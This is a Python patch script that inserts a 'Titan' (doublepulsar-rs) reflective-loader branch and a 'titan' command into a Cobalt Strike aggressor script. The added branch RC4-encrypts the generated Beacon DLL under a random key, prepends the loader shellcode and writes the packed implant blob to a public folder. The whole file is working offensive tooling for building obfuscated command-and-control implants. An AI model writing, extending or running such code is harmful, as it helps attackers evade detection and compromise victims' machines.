# -*- coding: utf-8 -*-
r"""patch_titan.py - add Titan (doublepulsar-rs) prepend branch: RC4-wrapped
blob per Titan.cna contract, plus the 'titan' cna command."""
import io

P = (r"C:\Users\Administrator\Desktop\cobaltstrike\cobaltstrike-ts"
     r"\p3-llvm-bench\tsboot_run\headless_franken.cna")
s = io.open(P, encoding="utf-8-sig").read()

L = chr(10)
TAB = chr(9)
B4 = chr(92) * 4

# 1. globals after $aceldr_bin line
i = s.find("$aceldr_bin = ")
assert i > 0, "aceldr_bin not found"
j = s.find(L, i)
gline = s[i:j]
ins = (gline + L +
       "$g_dp = 0;   # R2-4b: Titan (doublepulsar-rs) prepend-mode flag" + L +
       '$titan_bin = "C:' + B4 + 'Users' + B4 + 'Public' + B4 + 'dp_rs' + B4 + 'Titan.x64.bin";')
s = s[:i] + ins + s[j:]
print("globals inserted after:", gline[:50])

# 2. Titan branch right after the AceLdr branch inside the hook
aceldr_close = (TAB + TAB + TAB + 'return $out;' + L + TAB + TAB + '}')
k = s.find(aceldr_close)
assert k > 0, "aceldr branch close not found"
kend = k + len(aceldr_close)

branch = (
    L +
    TAB + TAB + '# R2-4b Titan (doublepulsar-rs) prepend mode - exact Titan.cna' + L +
    TAB + TAB + '# contract: RC4(DLL) wrapped as [I+ size][key16][buf]' + L +
    TAB + TAB + 'if ($g_dp == 1 && $3 eq "x64") {' + L +
    TAB + TAB + TAB + '$ldr = readb(openf($titan_bin), -1);' + L +
    TAB + TAB + TAB + '$sdll = setup_strings($2);' + L +
    TAB + TAB + TAB + '$str = "";' + L +
    TAB + TAB + TAB + '@chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";' + L +
    TAB + TAB + TAB + 'for ($x = 0; $x < 16; $x++) {' + L +
    TAB + TAB + TAB + TAB + '$str = $str . charAt(@chars, rand(strlen(@chars)));' + L +
    TAB + TAB + TAB + '}' + L +
    TAB + TAB + TAB + '$cip = [ Cipher getInstance: "RC4" ];' + L +
    TAB + TAB + TAB + '$key = [ new SecretKeySpec: $str, "RC4" ];' + L +
    TAB + TAB + TAB + '[ $cip init: [ Cipher DECRYPT_MODE ], $key ];' + L +
    TAB + TAB + TAB + '$buf = [ $cip doFinal: $sdll ];' + L +
    TAB + TAB + TAB + '$inf = pack(' + chr(39) + 'I+' + chr(39) + ', strlen($buf));' + L +
    TAB + TAB + TAB + '$inf .= $str . $buf;' + L +
    TAB + TAB + TAB + '$out = $ldr . $inf;' + L +
    TAB + TAB + TAB + 'writeb(openf(">C:' + B4 + 'Users' + B4 + 'Public' + B4 +
         'dp_rs' + B4 + 'titan_blob.bin"), $out);' + L +
    TAB + TAB + TAB + 'println("[UDRL-TITAN] ldr=" . strlen($ldr) . " inf=" . strlen($inf) . " blob=" . strlen($out));' + L +
    TAB + TAB + TAB + 'return setup_transformations($out, $3);' + L +
    TAB + TAB + '}'
)
s = s[:kend] + branch + s[kend:]
print("titan branch inserted")

# 3. add the titan command after the aceldr command
acmd_open = TAB + 'else if ($cmd eq "aceldr") {' + L
ci = s.find(acmd_open)
assert ci > 0
cm = L + TAB + '}' + L
cj = s.find(cm, ci) + len(cm)
titan_cmd = (
    TAB + 'else if ($cmd eq "titan") {' + L +
    TAB + TAB + '# R2-4b: Titan prepend blob (RC4 wrap) via GENERATE hook' + L +
    TAB + TAB + '$g_dp = 1;' + L +
    TAB + TAB + '$null = artifact_payload($a1, "dll", "x64");' + L +
    TAB + TAB + '$g_dp = 0;' + L +
    TAB + TAB + '$tp = "C:' + B4 + 'Users' + B4 + 'Public' + B4 + 'dp_rs' + B4 + 'titan_blob.bin";' + L +
    TAB + TAB + 'if (-exists $tp) {' + L +
    TAB + TAB + TAB + '$b = readb(openf($tp), -1);' + L +
    TAB + TAB + TAB + 'blog($bid, "titan: blob ready " . strlen($b) . "B");' + L +
    TAB + TAB + '} else {' + L +
    TAB + TAB + TAB + 'blog($bid, "titan: hook did not produce blob");' + L +
    TAB + TAB + '}' + L +
    TAB + TAB + 'return;' + L +
    TAB + '}' + L
)
s = s[:cj] + titan_cmd + s[cj:]
print("titan command added")

io.open(P, "w", encoding="utf-8", newline="").write(s)  # NO BOM (Sleep)
print("done - no BOM")
